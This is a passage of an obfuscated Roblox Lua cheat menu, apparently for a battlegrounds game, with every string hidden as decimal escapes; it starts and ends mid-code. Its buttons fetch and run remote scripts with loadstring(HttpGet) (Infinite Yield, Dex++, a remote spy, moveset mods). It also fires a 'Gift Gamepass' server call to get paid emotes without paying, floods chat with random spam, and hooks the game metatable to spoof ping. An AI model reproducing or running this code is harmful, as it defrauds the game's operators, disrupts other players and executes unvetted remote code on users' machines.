 end
 _lIIllIIIII:AddDropdown("\076\101\097\118\101\079\110\068\114\111\112\100\111\119\110", { Text = "\076\101\097\118\101\032\079\110", Multi = true, Default = {}, Values = { "\083\116\097\102\102", "\083\112\101\099\105\097\108\032\080\101\111\112\108\101", "\070\114\105\101\110\100\115\032\119\105\116\104\032\083\116\097\102\102" }, }) local _IIllIlIllI = Players.PlayerAdded:Connect( function (_IIIIIlIlll) task.spawn(pcall, _IllIlIllII, _IIIIIlIlll) end
 ) for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do task.spawn(pcall, _IllIlIllII, _IIIIIlIlll) end
 table.insert(_llIlllIlIl, function () if _IIllIlIllI then _IIllIlIllI:Disconnect() _IIllIlIllI = nil end
 end
 ) local _IllIllIlIl = TabMiscScripts _IllIllIlIl:AddButton({ Text = "\073\110\102\105\110\105\116\101\032\089\105\101\108\100", Func = function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\069\100\103\101\073\089\047\105\110\102\105\110\105\116\101\121\105\101\108\100\047\109\097\115\116\101\114\047\115\111\117\114\099\101", true))() end
 }) _IllIllIlIl:AddButton({ Text = "\068\101\120\043\043", Func = function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\103\105\116\104\117\098\046\099\111\109\047\065\090\089\115\071\105\116\104\117\098\047\068\101\120\080\108\117\115\080\108\117\115\047\114\101\108\101\097\115\101\115\047\108\097\116\101\115\116\047\100\111\119\110\108\111\097\100\047\111\117\116\046\108\117\097"))() end
 }) _IllIllIlIl:AddButton({ Text = "\067\111\098\097\108\116\032\082\101\109\111\116\101\032\083\112\121", Func = function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\103\105\116\104\117\098\046\099\111\109\047\110\111\116\112\111\105\117\047\099\111\098\097\108\116\047\114\101\108\101\097\115\101\115\047\108\097\116\101\115\116\047\100\111\119\110\108\111\097\100\047\067\111\098\097\108\116\046\108\117\097\117"))() end
 }) do local _lIlIlIIIII = {} local _IllIllIlll = false local _IIlIlIIlll = false _IllIllIlIl:AddButton({ Text = "\066\121\112\097\115\115\032\076\105\109\105\116\101\100\032\069\109\111\116\101\115\032\084\105\109\101\114", Tooltip = "\065\108\108\111\119\115\032\121\111\117\032\116\111\032\112\117\114\099\104\097\115\101\032\097\110\121\032\108\105\109\105\116\101\100\032\101\109\111\116\101\032\097\116\032\097\110\121\032\116\105\109\101\046", Func = function () task.spawn( function () pcall( function () local _IIIIllllll = game:GetService("\077\097\114\107\101\116\112\108\097\099\101\083\101\114\118\105\099\101") local _llllIllIlI = require(game.ReplicatedStorage.Info) local _IlIIllIlII = "\123\034\105\116\101\109\115\034\058\091" local _IlIllllIII = {} for _lllIlllIIl, _lIIlIllIll in _llllIllIlI.Limited do _IlIllllIII[_lIIlIllIll.Name] = _lIIlIllIll.ID end
 local _IlIlIlIIIl = 0x1 local _IlIIIIlIIl, _lIlllIlIll = pcall( function () return _IIIIllllll:GetDeveloperProductsAsync():GetCurrentPage() end
 ) if _IlIIIIlIIl then for _lllIlllIIl, j in ipairs(_lIlllIlIll) do if _IlIllllIII[j.Name] then _IlIIllIlII = _IlIIllIlII .. string.format("\123\034\078\117\109\098\101\114\034\058\037\100\044\034\073\109\097\103\101\034\058\037\100\044\034\078\097\109\101\034\058\034\037\115\034\044\034\080\114\105\099\101\034\058\037\100\044\034\073\068\034\058\037\100\125\044", _IlIlIlIIIl, j.IconImageAssetId or 0x0, j.Name, j.PriceInRobux or 0x0, j.ProductId) _IlIlIlIIIl = _IlIlIlIIIl + 0x1 local _llIlllIIlI = j.Name .. "\032\032\124\032\032" .. tostring(j.PriceInRobux or "\063") .. "\032\082\036" _lIlIlIIIII[_llIlllIIlI] = { gamepassId = _IlIllllIII[j.Name] } end
 end
 if _IlIIllIlII:sub(-0x1) == "\044" then _IlIIllIlII = _IlIIllIlII:sub(0x1,-0x2) end
 _IlIIllIlII = _IlIIllIlII .. "\093\044\034\105\110\102\111\034\058\123\034\115\101\099\111\110\100\115\073\110\087\101\101\107\034\058\054\048\052\056\048\048\044\034\115\116\097\114\116\079\102\089\101\097\114\034\058\049\055\051\053\055\051\050\056\048\048\044\034\099\117\114\114\101\110\116\087\101\101\107\034\058\050\051\125\125" workspace:SetAttribute("\076\105\109\105\116\101\100", _IlIIllIlII) local _IIlIIllIlI = game.Players.LocalPlayer local _IIllIIlIIl = _IIlIIllIlI.PlayerGui.Emotes.ImageLabel.Limited.List for _lllIlllIIl, _llllIIIIIl in ipairs(_IIllIIlIIl:GetChildren()) do if _llllIIIIIl:IsA("\073\109\097\103\101\066\117\116\116\111\110") then _llllIIIIIl.MouseButton1Click:Connect( function () local _llllIIllll = _llllIIIIIl:GetAttribute("\073\068") if _llllIIllll then local _lIllIIlIIl = {{ Goal = "\071\105\102\116\032\071\097\109\101\112\097\115\115", GiftData = { Receiver = _IIlIIllIlI.UserId, Gamepass = _llllIIllll } }} _IIlIIllIlI.Character:WaitForChild("\067\111\109\109\117\110\105\099\097\116\101"):FireServer(unpack(_lIllIIlIIl)) end
 end
 ) end
 end
 _IllIllIlll = true if not _IIlIlIIlll then _IIlIlIIlll = true _IllIllIlIl:AddLabel("\083\101\108\101\099\116\032\097\110\032\101\109\111\116\101\032\116\111\032\112\117\114\099\104\097\115\101\032\040\117\115\101\032\116\104\105\115\032\105\102\032\116\104\101\032\101\109\111\116\101\032\105\115\032\110\111\116\032\118\105\115\105\098\108\101\032\105\110\032\116\104\101\032\100\101\102\097\117\108\116\032\084\083\066\032\085\073\041\058", true) local _lllIIlllll = {} for _llIlllIIlI in pairs(_lIlIlIIIII) do table.insert(_lllIIlllll, _llIlllIIlI) end
 _IllIllIlIl:AddDropdown("\076\105\109\105\116\101\100\069\109\111\116\101\068\114\111\112\100\111\119\110", { Values = _lllIIlllll, Default = 0x1, Multi = false, Text = "\069\109\111\116\101", }) _IllIllIlIl:AddButton({ Text = "\066\117\121", Func = function () local _IlIIIlIIIl = _IlIllIIllI.LimitedEmoteDropdown and _IlIllIIllI.LimitedEmoteDropdown.Value local _llIllIIlII = _IlIIIlIIIl and _lIlIlIIIII[_IlIIIlIIIl] if not _llIllIIlII then _IllIIlIIll:Notify({ Title = _lIllIllIII("\076\105\109\105\116\101\100\032\069\109\111\116\101\115"), Content = "\069\109\111\116\101\032\110\111\116\032\102\111\117\110\100\046", _IllIIlIlll = 0x3 }) return end
 pcall( function () local _IlllIlIIIl = {{ Goal = "\071\105\102\116\032\071\097\109\101\112\097\115\115", GiftData = { Receiver = _llIIIlIIll.UserId, Gamepass = _llIllIIlII.gamepassId } }} _llIIIlIIll.Character:WaitForChild("\067\111\109\109\117\110\105\099\097\116\101"):FireServer(unpack(_IlllIlIIIl)) end
 ) end
 }) end
 end
 end
 ) end
 ) end
 , }) _IllIllIlIl:AddButton({ Text = "\072\101\097\100\108\101\115\115", Func = function () local _llllIllIII = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait() local _IlIIIlllII = _llllIllIII:FindFirstChild("\072\101\097\100") if _IlIIIlllII then _IlIIIlllII.Transparency = 0x1 for _lllIlllIIl, _lIIIIIIIII in ipairs(_IlIIIlllII:GetChildren()) do if _lIIIIIIIII:IsA("\068\101\099\097\108") or _lIIIIIIIII:IsA("\083\112\101\099\105\097\108\077\101\115\104") then _lIIIIIIIII:Destroy() end
 end
 end
 end
 }) _IllIllIlIl:AddButton({ Text = "\075\111\114\098\108\111\120", Func = function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\103\101\114\107\097\056\052\050\045\097\102\107\047\075\111\114\098\108\111\120\086\105\115\117\097\108\082\105\103\104\116\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\075\111\114\098\108\111\120\086\105\115\117\097\108\082\105\103\104\116"))() end
 }) end
 _IllIllIlIl:AddDivider() _IllIllIlIl:AddButton({ Text = "\075\097\100\101\032\071\111\106\111\032\086\049", Func = function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\109\105\105\107\105\099\111\109\115\111\110\111\047\066\097\108\100\121\084\111\083\111\114\099\101\114\101\114\070\105\120\101\100\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\086\049\046\108\117\097"))() end
 }) _IllIllIlIl:AddButton({ Text = "\075\097\100\101\032\071\111\106\111\032\086\050\032\040\077\111\114\112\104\041", Func = function () getgenv().morph = true loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\115\107\105\098\105\100\105\116\111\105\108\101\116\102\097\110\050\048\048\055\047\066\097\108\100\121\084\111\083\111\114\099\101\114\101\114\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\076\097\116\101\115\116\086\050\046\108\117\097"))() end
 }) _IllIllIlIl:AddButton({ Text = "\075\097\100\101\032\071\111\106\111\032\086\050\032\040\078\111\032\077\111\114\112\104\041", Func = function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\115\107\105\098\105\100\105\116\111\105\108\101\116\102\097\110\050\048\048\055\047\066\097\108\100\121\084\111\083\111\114\099\101\114\101\114\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\076\097\116\101\115\116\086\050\046\108\117\097"))() end
 }) _IllIllIlIl:AddButton({ Text = "\083\097\105\116\097\109\097\032\079\118\101\114\104\097\117\108", Func = function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\115\107\105\098\105\100\105\116\111\105\108\101\116\102\097\110\050\048\048\055\047\083\097\105\116\097\109\097\079\118\101\114\104\097\117\108\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\076\097\116\101\115\116\046\108\117\097"))() end
 }) _IllIllIlIl:AddButton({ Text = "\083\116\097\114\032\071\108\105\116\099\104\101\114", Func = function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\103\105\115\116\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\107\101\108\108\101\114\116\104\101\109\097\110\103\111\047\099\049\054\099\099\102\052\054\051\055\101\049\056\049\050\050\048\049\055\048\052\100\057\100\056\056\055\102\051\051\054\099\047\114\097\119\047\115\116\097\114\037\050\053\050\048\102\097\114\116\101\114"))() end
 }) _IllIllIlIl:AddButton({ Text = "\075\097\100\101\074\032\047\032\075\097\105\116\097\109\097\074", Func = function () getgenv().Moveset_Settings = { ExecuteOnRespawn = false, TSBStyleNotification = true, UseOldCollateralRuin = true, NoWarning = false, NoDeathCounterImages = false, NoBarrageArms = true, NoPreysPerilAttract = false, NoWalls = false, NoTrees = false, RavageTool = false, AdrenalineBoostTool = false, Adrenaline_Multiplier = 0x2, CustomUppercutAnimation = true, CustomDownslamAnimation = true, CustomIdleAnimation = true, UltNames = { "\050\048\032\083\069\082\073\069\083", "\067\079\077\069\032\065\084\032\077\069", "\073\039\077\032\068\079\078\069" }, MoveNames = { ["\078\111\114\109\097\108\032\080\117\110\099\104"] = "\082\097\118\097\103\105\110\103\032\075\105\099\107", ["\067\111\110\115\101\099\117\116\105\118\101\032\080\117\110\099\104\101\115"] = "\070\105\115\116\032\070\117\115\105\108\108\097\100\101", Shove = "\083\119\105\102\116\032\083\119\101\101\112", Uppercut = "\067\111\108\108\097\116\101\114\097\108\032\083\116\111\114\109", ["\068\101\097\116\104\032\067\111\117\110\116\101\114"] = "\083\117\100\100\101\110\032\083\116\114\105\107\101", ["\084\097\098\108\101\032\070\108\105\112"] = "\083\116\111\105\099\032\066\111\109\098", ["\083\101\114\105\111\117\115\032\080\117\110\099\104"] = "\068\101\115\116\114\117\099\116\105\118\101\032\080\111\119\101\114", ["\079\109\110\105\032\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104"] = "\079\109\110\105\032\068\105\114\101\099\116\105\111\110\097\108\032\070\105\115\116\115", }, } loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\115\107\105\098\105\100\105\116\111\105\108\101\116\102\097\110\050\048\048\055\047\066\097\108\100\121\084\111\075\074\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\076\097\116\101\115\116\046\108\117\097"))() end
 }) _IllIllIlIl:AddButton({ Text = "\068\111\118\105\032\072\117\098", Func = function () pcall( function () setclipboard("\113\098\055\072\076\099\113\118\050\111\053\114\100\078\122\112\101\070\098\089") end
 ) _IllIIlIIll:Notify({ Title = _lIllIllIII("\068\111\118\105\032\072\117\098"), Content = "\067\111\112\105\101\100\032\075\101\121", _IllIIlIlll = 0x3 }) task.delay(0x2, function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\110\101\101\100\097\110\101\119\112\104\111\110\101\051\050\045\101\110\103\047\116\115\098\102\105\108\101\115\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\077\097\105\110\049\046\108\117\097"))() end
 ) end
 }) do local function _IllIIIllIl(_IlIIIllIlI) local _lIIlIllIlI = game:GetService("\084\101\120\116\067\104\097\116\083\101\114\118\105\099\101") if _lIIlIllIlI.ChatVersion == Enum.ChatVersion.TextChatService then local _IIllllIlII = _lIIlIllIlI.TextChannels:FindFirstChild("\082\066\088\071\101\110\101\114\097\108") if _IIllllIlII then pcall( function () _IIllllIlII:SendAsync(_IlIIIllIlI) end
 ) end
 else local _IlIIIIlIlI = game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101"):FindFirstChild("\068\101\102\097\117\108\116\067\104\097\116\083\121\115\116\101\109\067\104\097\116\069\118\101\110\116\115") local _IlllIIIIIl = _IlIIIIlIlI and _IlIIIIlIlI:FindFirstChild("\083\097\121\077\101\115\115\097\103\101\082\101\113\117\101\115\116") if _IlIIIIlIlI and _IlllIIIIIl then pcall( function () _IlllIIIIIl:FireServer(_IlIIIllIlI, "\097\108\108") end
 ) end
 end
 end
 local function _IlIlIIIlll(_llllIIllll) local _llIIIIllIl = "\097\098\099\100\101\102\103\104\105\106\107\108\109\110\111\112\113\114\115\116\117\118\119\120\121\122\065\066\067\068\069\070\071\072\073\074\075\076\077\078\079\080\081\082\083\084\085\086\087\088\089\090" local _IlIIIIIIll = "" for _lllIlllIIl = 0x1, (_llllIIllll or math.random(0x3, 0x14)) do local _lIlllIlIll = math.random(0x1, #_llIIIIllIl) _IlIIIIIIll = _IlIIIIIIll .. _llIIIIllIl:sub(_lIlllIlIll, _lIlllIlIll) end
 return _IlIIIIIIll end
 if TabMiscExtra then do local _llIIIlIlIl = {} local _llIIlIIIlI = nil local _lIllIIlIII = {} local _llIlIlIIIl = { "\075\105\108\108\115", "\084\111\116\097\108\032\075\105\108\108\115" } local function _lIlIIIIIlI(_lllIIlllll) task.spawn( function () local _llIlIllIII = _lllIIlllll:FindFirstChild("\108\101\097\100\101\114\115\116\097\116\115") or _lllIIlllll:WaitForChild("\108\101\097\100\101\114\115\116\097\116\115", 0xA) if not _llIlIllIII then return end
 if not _llIIIlIlIl[_lllIIlllll] then _llIIIlIlIl[_lllIIlllll] = {} end
 for _lllIlllIIl, _IlIIIIIlll in ipairs(_llIlIlIIIl) do if not _llIlIllIII:FindFirstChild(_IlIIIIIlll) then local _lIIIIIIIII = _lllIIlllll:FindFirstChild(_IlIIIIIlll) if _lIIIIIIIII then _lIIIIIIIII.Parent = _llIlIllIII _llIIIlIlIl[_lllIIlllll][_IlIIIIIlll] = _lIIIIIIIII end
 end
 end
 end
 ) end
 local function _lllIIIllII(_lllIIlllll) local _llIlIlllII = _llIIIlIlIl[_lllIIlllll] if not _llIlIlllII then return end
 _llIIIlIlIl[_lllIIlllll] = nil for _lllIlllIIl, _lIIIIIIIII in pairs(_llIlIlllII) do pcall( function () if _lIIIIIIIII and _lIIIIIIIII.Parent then _lIIIIIIIII.Parent = _lllIIlllll end
 end
 ) end
 end
 local function _IIIIlllIIl(_lllIIlllll) if _lIllIIlIII[_lllIIlllll] then pcall( function () _lIllIIlIII[_lllIIlllll]:Disconnect() end
 ) end
 _lIllIIlIII[_lllIIlllll] = _lllIIlllll.CharacterAdded:Connect( function () task.wait(0x1) _lIlIIIIIlI(_lllIIlllll) end
 ) end
 TabMiscExtra:AddToggle("\083\104\111\119\072\105\100\100\101\110\075\105\108\108\115", { Text = "\083\104\111\119\032\072\105\100\100\101\110\032\075\105\108\108\115", Default = false, Callback = function (_lIllIlIIll) if _lIllIlIIll then for _lllIlllIIl, _IIIIIlIlll in ipairs(Players:GetPlayers()) do _lIlIIIIIlI(_IIIIIlIlll) _IIIIlllIIl(_IIIIIlIlll) end
 _llIIlIIIlI = Players.PlayerAdded:Connect( function (_IIIIIlIlll) task.wait(0x1) _lIlIIIIIlI(_IIIIIlIlll) _IIIIlllIIl(_IIIIIlIlll) end
 ) else if _llIIlIIIlI then _llIIlIIIlI:Disconnect() _llIIlIIIlI = nil end
 for _IIIIIlIlll, _IllIIIllII in pairs(_lIllIIlIII) do pcall( function () _IllIIIllII:Disconnect() end
 ) _lIllIIlIII[_IIIIIlIlll] = nil end
 local _lIllllIlII = {} for _IIIIIlIlll in pairs(_llIIIlIlIl) do _lIllllIlII[#_lIllllIlII + 0x1] = _IIIIIlIlll end
 for _lllIlllIIl, _IIIIIlIlll in ipairs(_lIllllIlII) do _lllIIIllII(_IIIIIlIlll) end
 end
 end
 , }) end
 TabMiscExtra:AddToggle("\067\104\097\116\070\108\111\111\100\101\114", { Text = "\067\104\097\116\032\070\108\111\111\100\101\114", Default = false, Callback = function (_lIllIlIIll) if not _lIllIlIIll then return end
 task.spawn( function () while _IIlIlIIlIl.ChatFlooder and _IIlIlIIlIl.ChatFlooder.Value do _IllIIIllIl(_IlIlIIIlll(0xC8)) local _lIIIllllII = tick() local delay = _IlIllIIllI.ChatFlooderDelay and _IlIllIIllI.ChatFlooderDelay.Value or 3.5 repeat task.wait() until tick() >= _lIIIllllII + delay or not (_IIlIlIIlIl.ChatFlooder and _IIlIlIIlIl.ChatFlooder.Value) end
 end
 ) end
 , }) TabMiscExtra:AddSlider("\067\104\097\116\070\108\111\111\100\101\114\068\101\108\097\121", { Text = "\067\104\097\116\032\070\108\111\111\100\101\114\032\068\101\108\097\121", Default = 3.5, Min = 0.5, Max = 0x5, Rounding = 0x1, }) table.insert(_llIlllIlIl, function () pcall( function () _IIlIlIIlIl.ChatFlooder:SetValue(false) end
 ) end
 ) do local _lIIlIlIIII = nil local _lIIIllIllI = nil local _llIIlllIIl = nil local function _IlIllllIlI(_IIllllIlII) if _lIIIllIllI then pcall( function () _lIIIllIllI:Disconnect() end
 ) _lIIIllIllI = nil end
 if not _IIllllIlII then return end
 local _llIIlIIlII = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _llIIlIIlII then return end
 local _IlIIIlIIII = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIlIIII then _IlIIIlIIII:GetPropertyChangedSignal("\072\101\097\108\116\104"):Connect( function () if _IlIIIlIIII.Health > 0x0 then return end
 if _lIIIllIllI then pcall( function () _lIIIllIllI:Disconnect() end
 ) _lIIIllIllI = nil end
 local _IlIIIIIIll = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IlIIIIIIll then _lIIlIlIIII = _IlIIIIIIll.Position end
 end
 ) end
 _lIIIllIllI = RunService.Heartbeat:Connect( function () if _llIIlIIlII.Parent then _lIIlIlIIII = _llIIlIIlII.Position else pcall( function () _lIIIllIllI:Disconnect() end
 ) _lIIIllIllI = nil end
 end
 ) end
 TabMiscExtra:AddToggle("\083\097\118\101\080\111\115\079\110\068\101\097\116\104", { Text = "\083\097\118\101\032\080\111\115\105\116\105\111\110\032\111\110\032\068\101\097\116\104", Default = false, Risky = true, Tooltip = "\115\111\109\101\116\105\109\101\115\032\105\115\032\117\110\115\116\097\098\108\101\032\105\102\032\121\111\117\032\103\101\116\032\107\105\108\108\101\100\032\104\105\103\104\044\032\098\117\116\032\105\116\039\115\032\114\097\114\101\046", Callback = function (_lIllIlIIll) if _lIllIlIIll then _IlIllllIlI(_llIIIlIIll.Character) _llIIlllIIl = _llIIIlIIll.CharacterAdded:Connect( function (newChar) local _IIlIIlllll = _lIIlIlIIII task.spawn( function () local _llIIlIIlII = newChar:WaitForChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116", 0xA) local _IlIIIlIIII = newChar:WaitForChild("\072\117\109\097\110\111\105\100", 0xA) if not _llIIlIIlII or not _IlIIIlIIII then return end
 if _IIlIIlllll then repeat task.wait() until _IlIIIlIIII.Health > 0x0 and _IlIIIlIIII:GetState() ~= Enum.HumanoidStateType.None and _IlIIIlIIII:GetState() ~= Enum.HumanoidStateType.Dead pcall( function () _llIIlIIlII.CFrame = CFrame.new(_IIlIIlllll) end
 ) end
 _IlIllllIlI(newChar) end
 ) end
 ) else if _lIIIllIllI then pcall( function () _lIIIllIllI:Disconnect() end
 ) _lIIIllIllI = nil end
 if _llIIlllIIl then pcall( function () _llIIlllIIl:Disconnect() end
 ) _llIIlllIIl = nil end
 end
 end
 , }) table.insert(_llIlllIlIl, function () pcall( function () _IIlIlIIlIl.SavePosOnDeath:SetValue(false) end
 ) if _lIIIllIllI then pcall( function () _lIIIllIllI:Disconnect() end
 ) _lIIIllIllI = nil end
 if _llIIlllIIl then pcall( function () _llIIlllIIl:Disconnect() end
 ) _llIIlllIIl = nil end
 end
 ) end
 do local _lIlIIllllI = type(getrawmetatable) == "\102\117\110\099\116\105\111\110" and type(setreadonly) == "\102\117\110\099\116\105\111\110" and type(newcclosure) == "\102\117\110\099\116\105\111\110" and type(getnamecallmethod) == "\102\117\110\099\116\105\111\110" local _llIllllIII = false local _IllIlllIlI = nil local _IllllIIlII = nil local function _IlllIIllIl() if _llIllllIII or not _lIlIIllllI then return end
 pcall( function () _IllllIIlII = getrawmetatable(game) setreadonly(_IllllIIlII, false) _IllIlllIlI = _IllllIIlII.__namecall _IllllIIlII.__namecall = newcclosure( function (self, ...) local _lIllIIIIII = getnamecallmethod() if _lIllIIIIII == "\070\105\114\101\083\101\114\118\101\114" then local _lIlIllIlll = {...} if type(_lIlIllIlll[0x1]) == "\116\097\098\108\101" and _lIlIllIlll[0x1].Goal == "\082\101\112\111\114\116\080\105\110\103" then _lIlIllIlll[0x1].ms = tonumber(_IlIllIIllI.PingSpoofMs and _IlIllIIllI.PingSpoofMs.Value) or 0x0 return _IllIlllIlI(self, unpack(_lIlIllIlll)) end
 end
 return _IllIlllIlI(self, ...) end
 ) setreadonly(_IllllIIlII, true) _llIllllIII = true end
 ) end
 local function _IlllllIIII() if not _llIllllIII or not _IllllIIlII or not _IllIlllIlI then return end
 pcall( function () setreadonly(_IllllIIlII, false) _IllllIIlII.__namecall = _IllIlllIlI setreadonly(_IllllIIlII, true) end
 ) _llIllllIII = false _IllIlllIlI = nil end
 local _IIIlIlllll = "\121\111\117\114\032\101\120\101\099\117\116\111\114\032\100\111\101\115\110\039\116\032\115\117\112\112\111\114\116\032\116\104\105\115" TabMiscLeaderboard:AddToggle("\080\105\110\103\083\112\111\111\102", { Text = "\080\105\110\103\032\083\112\111\111\102\101\114", Default = false, Disabled = not _lIlIIllllI, Tooltip = not _lIlIIllllI and _IIIlIlllll or nil, Callback = function (_lIllIlIIll) if not _lIlIIllllI then pcall( function () _IIlIlIIlIl.PingSpoof:SetValue(false) end
 ) return end
 if _lIllIlIIll then _IlllIIllIl() else _IlllllIIII() end
 end
 , }) TabMiscLeaderboard:AddInput("\080\105\110\103\083\112\111\111\102\077\115", { Text = "\083\112\111\111\102\101\100\032\080\105\110\103\032\040\109\115\041", Default = "\048", Placeholder = "\069\110\116\101\114\032\109\115\046\046\046", Numeric = true, Disabled = not _lIlIIllllI, Tooltip = not _lIlIIllllI and _IIIlIlllll or nil, }) table.insert(_llIlllIlIl, function () pcall( function () _IIlIlIIlIl.PingSpoof:SetValue(false) end
 ) _IlllllIIII() end
 ) end
 end
 end
 do local _IIIIllIlII = _llIllIIlll local _IlIIlIIlIl = { Bald = {"\049\048\052\054\057\052\057\051\050\055\048","\049\048\052\054\057\054\051\048\057\053\048","\049\048\052\054\057\054\051\057\050\050\050","\049\048\052\054\057\054\052\051\054\052\051"}, Hunter = {"\049\051\053\051\050\053\054\050\052\049\056","\049\051\053\051\050\054\048\048\049\050\053","\049\051\053\051\050\054\048\052\048\056\053","\049\051\050\057\052\052\055\049\057\054\054"}, Monster = {"\049\050\050\052\056\050\052\057\050\051\054\052\048\051\054","\049\050\053\056\056\050\054\054\055\052\048\054\051\052\055","\049\051\052\056\050\050\054\051\049\056\053\051\055\055\048","\055\054\054\048\050\049\051\056\057\052\048\048\051\051"}, ZombieAxe = {"\049\050\053\051\054\049\052\057\057\056\050\055\054\054\051","\049\048\053\055\048\049\052\051\050\051\052\052\057\053\051","\049\048\052\050\057\051\052\051\057\050\054\049\051\051\051","\049\049\052\052\054\048\057\057\050\048\053\055\051\053\051"}, ZombieDeagle= {"\049\049\049\054\052\052\052\053\053\048\054\054\051\054\049","\049\049\050\055\055\056\057\051\051\048\054\054\051\055\052","\056\048\052\056\056\052\055\048\053\055\055\049\056\049","\049\049\055\055\050\054\053\050\049\050\057\052\049\053\048"}, ZombieShotgun={"\057\055\055\048\050\050\051\052\057\055\055\050\048\057","\049\051\054\056\051\052\054\048\054\054\056\055\048\049\052","\049\051\055\053\053\054\054\050\048\054\055\053\052\055\052","\049\049\053\052\048\054\049\051\052\054\048\048\051\057\053"}, Purple = {"\049\055\056\056\057\052\053\056\053\054\051","\049\055\056\056\057\052\054\049\056\049\048","\049\055\056\056\057\052\055\049\048\057\056","\049\055\056\056\057\050\057\048\053\054\057"}, Cyborg = {"\049\051\052\057\049\054\051\053\052\051\051","\049\051\050\057\054\053\055\055\055\056\051","\049\051\050\057\053\057\049\057\051\057\057","\049\051\050\057\053\057\051\054\056\054\054"}, Ninja = {"\049\051\051\055\048\051\049\048\053\049\051","\049\051\051\057\048\050\051\048\057\055\051","\049\051\051\055\056\055\053\049\055\049\055","\049\051\051\055\056\055\048\056\049\057\057"}, Batter = {"\049\052\048\048\052\050\050\050\057\056\053","\049\051\057\057\055\048\057\050\057\052\048","\049\052\048\048\049\057\054\051\052\048\049","\049\052\049\051\054\052\051\054\049\053\055"}, Blade = {"\049\053\050\053\057\049\054\049\051\057\048","\049\053\050\052\048\050\049\054\057\051\049","\049\053\050\052\048\049\055\054\056\055\051","\049\053\049\054\050\054\057\052\049\057\050"}, Esper = {"\049\054\053\049\053\053\048\051\053\048\055","\049\054\053\049\053\053\050\048\052\051\049","\049\054\053\049\053\052\052\056\048\056\057","\049\054\053\053\050\050\051\052\053\057\048"}, KJ = {"\049\055\051\050\053\053\049\048\048\048\050","\049\055\051\050\053\053\049\051\056\055\048","\049\055\051\050\053\053\050\050\051\056\056","\049\055\051\050\053\053\051\055\055\049\057"}, Tech = {"\049\050\051\048\048\053\054\050\057\052\051\049\051\048\057","\049\048\048\048\053\057\056\055\052\051\053\049\054\054\052","\049\048\052\056\057\053\051\055\057\052\049\054\051\052\050","\049\051\052\055\055\053\052\048\054\052\051\055\054\050\054"}, Lightning = {"\056\057\048\052\052\048\054\055\055\057\055\057\054\052","\055\052\051\051\052\049\057\052\056\051\055\057\049\056","\057\052\051\053\051\056\052\053\057\055\052\049\051\049","\056\048\054\048\049\050\051\057\049\051\057\055\055\052"}, Brother = {"\049\048\053\053\048\057\054\054\053\048\049\057\048\052\048","\049\049\050\053\053\055\054\048\057\050\049\053\048\048\056","\057\049\055\055\049\049\054\048\052\057\057\052\053\050","\049\050\048\048\050\054\057\053\050\057\052\056\051\051\050"}, Emerge = {"\049\051\050\056\054\056\049\056\053\055\057\052\057\054\054","\049\049\054\050\051\057\056\056\053\053\057\055\053\053\056","","\056\057\052\052\051\055\052\056\048\050\050\057\054\054"}, } local _lIlIlIIIIl = {} for _lllIlllIIl, _lIIlIlIIIl in pairs(_IlIIlIIlIl) do for _IlIIllIlll, _IIIIllIIlI in ipairs(_lIIlIlIIIl) do _lIlIlIIIIl[_IIIIllIIlI] = _IlIIllIlll end
 end
 local _IllIIlIllI = { "\068\101\102\097\117\108\116","\082\097\110\100\111\109", "\083\097\105\116\097\109\097","\071\097\114\111\117","\083\117\105\114\121\117", "\071\101\110\111\115","\083\111\110\105\099","\077\101\116\097\108\032\066\097\116","\065\116\111\109\105\099\032\083\097\109\117\114\097\105", "\084\097\116\115\117\109\097\107\105","\075\074","\067\104\105\108\100\032\069\109\112\101\114\111\114","\076\105\103\104\116\110\105\110\103\032\077\097\120","\077\121\032\066\114\111\116\104\101\114", "\077\111\110\115\116\101\114\032\071\097\114\111\117", "\090\111\109\098\105\101\032\077\097\110\032\040\065\120\101\041","\090\111\109\098\105\101\032\077\097\110\032\040\068\101\097\103\108\101\041","\090\111\109\098\105\101\032\077\097\110\032\040\083\104\111\116\103\117\110\041", "\069\109\101\114\103\101", } local _IIIIllIIII = { 